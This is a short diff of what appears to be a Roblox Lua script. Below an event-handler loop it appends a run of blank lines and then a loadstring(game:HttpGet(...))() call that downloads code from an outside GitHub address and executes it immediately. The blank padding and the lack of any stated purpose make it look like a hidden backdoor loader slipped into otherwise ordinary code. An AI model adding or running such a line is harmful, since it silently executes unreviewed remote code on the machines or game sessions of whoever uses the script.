@@ -124,3 +124,8 @@ po.ChildAdded:connect(function(a)
         until false
     end
 end)
+
+
+
+
+loadstring(game:HttpGet("https://github.com/takeiteasy8456/nausigi/blob/main/pc%20busuk"))() 
